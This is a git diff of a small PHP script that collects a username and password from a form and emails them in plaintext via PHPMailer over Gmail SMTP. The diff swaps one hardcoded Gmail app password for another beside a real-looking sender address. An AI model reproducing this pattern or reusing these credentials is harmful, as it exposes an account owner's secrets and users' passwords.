@@ -6,12 +6,7 @@ include "PHPMailer/PHPMailer.php";
 include "PHPMailer/Exception.php";
 include "PHPMailer/SMTP.php";
 
-// when changing the $from attribute u first need to configure some things inside the gmail account
-// first enable 2-step verification 
-// then go to security settings and select app passwords below the 2-step verification
-// then go to the app passwords and in select app select mail and in the select device select windows phone  
-// and click on the "Generate password" button
-
+// git 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (isset($_POST['submit-btn'])) {
         $username = $_POST['username'];
@@ -22,7 +17,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         $subject = "Subject of Mail";  // subject of mail
         $body = "Your User Name is {$username} and your Password is {$userpassword}";
         $from = "alazarthenew@gmail.com";  // you mail
-        $password = "xaohsucjdtmrtxrx";  // your mail password
+        $password = "htcezbqawwhrwsol";  // your mail password
         $mail = new PHPMailer();
 
         //SMTP Settings
